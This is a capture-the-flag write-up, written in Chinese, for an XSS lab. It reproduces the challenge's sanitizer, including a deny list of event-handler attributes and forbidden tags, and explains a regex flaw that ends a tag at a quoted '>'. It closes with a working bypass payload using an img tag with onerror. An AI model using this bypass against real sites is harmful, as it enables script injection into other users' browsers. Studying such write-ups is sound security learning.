## XSS challenge2

1.进去靶场有个输入框

![image-20250204184558451](https://github.com/Martins555666/Hackinghub-writeups/blob/main/image/image-20250204184558451.png)

2.尝试输入<u>111</u>,但并没有显示在页面中



3.f12分析下js，以下为js全部代码

<script>
    const input = document.getElementById('input');
    const getInput = () => input.value;
    const mainUrl = location.href.split('?')[0];
    const iframe = document.getElementById('ifr');
    input.value = new URL(location).searchParams.get('xss');


    <textarea autofocus oninput=process() id=input></textarea><br>
    
    <script>
        const input = document.getElementById('input');
        const getInput = () => input.value;
        const mainUrl = location.href.split('?')[0];
        const iframe = document.getElementById('ifr');
        input.value = new URL(location).searchParams.get('xss');
        
    function sanitize(input) {
        const TAG_REGEX = /<\/?(\w*)([^>]*)>/gmi;
        const COMMENT_REGEX = /<!--.*?-->/gmi;
        const END_TAG_REGEX = /^<\//;
        // Taken from XSS Cheat Sheet by Portswigger
        const FORBIDDEN_ATTRS = ["onactivate","onafterprint","onanimationcancel","onanimationend","onanimationiteration","onanimationstart","onauxclick","onbeforeactivate","onbeforecopy","onbeforecut","onbeforedeactivate","onbeforepaste","onbeforeprint","onbeforeunload","onbegin","onblur","onbounce","oncanplay","oncanplaythrough","onchange","onclick","oncontextmenu","oncopy","oncut","ondblclick","ondeactivate","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","onend","onended","onerror","onfinish","onfocus","onfocusin","onfocusout","onhashchange","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onloadend","onloadstart","onmessage","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onpageshow","onpaste","onpause","onplay","onplaying","onpointerover","onpointerdown","onpointerenter","onpointerleave","onpointermove","onpointerout","onpointerup","onpointerrawupdate","onpopstate","onreadystatechange","onrepeat","onreset","onresize","onscroll","onsearch","onseeked","onseeking","onselect","onstart","onsubmit","ontimeupdate","ontoggle","ontouchstart","ontouchend","ontouchmove","ontransitioncancel","ontransitionend","ontransitionrun","onunhandledrejection","onunload","onvolumechange","onwaiting","onwheel"];
        const FORBIDDEN_TAGS = ["script", "style", "noscript", "template", "svg", "math"];
        
        let sanitized = input;
    
        sanitized = sanitized.replace(COMMENT_REGEX, '');
        sanitized = sanitized.replace(TAG_REGEX, (wholeTag, tagName, attributes) => {
            tagName = tagName.toLowerCase();
            
            if (FORBIDDEN_TAGS.includes(tagName)) return '';
            
            if (END_TAG_REGEX.test(wholeTag)) {
                return `</${tagName}>`;
            }
            for (let attr of FORBIDDEN_ATTRS) {
                attributes = attributes.replace(new RegExp(attr + '\\s*=', 'gi'), '_ROBUST_XSS_PROTECTION_=');
            }
            
            return `<${tagName}${attributes}>`
        });
        return sanitized;
        
    }
    
    function process() {
        const input = getInput();
        history.replaceState(null, null,  '?xss=' + encodeURIComponent(input));
        
        const div = document.createElement('div');
        div.innerHTML = sanitize(input);
        // document.body.appendChild(div)
    }
    
    process();
    </script>
        
        



 4.发现主要函数为**process（）**函数，函数首先对输入的语句进行URL编码，然后把语句放到**sanitize(input)**函数中，看是否为正常的语句，所以我们主要就是绕过 sanitize(input)函数中的过滤。



5.以下分析sanitize函数

```
function sanitize(input) {
    const TAG_REGEX = /<\/?(\w*)([^>]*)>/gmi;
    const COMMENT_REGEX = /<!--.*?-->/gmi;
    const END_TAG_REGEX = /^<\//;
    // Taken from XSS Cheat Sheet by Portswigger
    const FORBIDDEN_ATTRS = ["onactivate","onafterprint","onanimationcancel","onanimationend","onanimationiteration","onanimationstart","onauxclick","onbeforeactivate","onbeforecopy","onbeforecut","onbeforedeactivate","onbeforepaste","onbeforeprint","onbeforeunload","onbegin","onblur","onbounce","oncanplay","oncanplaythrough","onchange","onclick","oncontextmenu","oncopy","oncut","ondblclick","ondeactivate","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","onend","onended","onerror","onfinish","onfocus","onfocusin","onfocusout","onhashchange","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onloadend","onloadstart","onmessage","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onpageshow","onpaste","onpause","onplay","onplaying","onpointerover","onpointerdown","onpointerenter","onpointerleave","onpointermove","onpointerout","onpointerup","onpointerrawupdate","onpopstate","onreadystatechange","onrepeat","onreset","onresize","onscroll","onsearch","onseeked","onseeking","onselect","onstart","onsubmit","ontimeupdate","ontoggle","ontouchstart","ontouchend","ontouchmove","ontransitioncancel","ontransitionend","ontransitionrun","onunhandledrejection","onunload","onvolumechange","onwaiting","onwheel"];
    const FORBIDDEN_TAGS = ["script", "style", "noscript", "template", "svg", "math"];
    
    let sanitized = input;

    sanitized = sanitized.replace(COMMENT_REGEX, '');
    sanitized = sanitized.replace(TAG_REGEX, (wholeTag, tagName, attributes) => {
        tagName = tagName.toLowerCase();
        
        if (FORBIDDEN_TAGS.includes(tagName)) return '';
        
        if (END_TAG_REGEX.test(wholeTag)) {
            return `</${tagName}>`;
        }
        for (let attr of FORBIDDEN_ATTRS) {
            attributes = attributes.replace(new RegExp(attr + '\\s*=', 'gi'), '_ROBUST_XSS_PROTECTION_=');
        }
        
        return `<${tagName}${attributes}>`
    });
    return sanitized;
    
}
```



其中代码首先对script等一系列标签进行了过滤，发现img标签并没有被过滤，其次对几乎所有的on事件都进行过滤，所以我们不能直接从绕on事件上入手，在正则匹配中可以发现问题

```
 const TAG_REGEX = /<\/?(\w*)([^>]*)>/gmi;
```

重要匹配到两个尖括号就会截取下来，例：

```
<img id=">"> 就会识别为 <img id=">
```

所以我们就可以利用该漏洞进行绕过：

```
<img src=">" onerror=alert(1)>
```

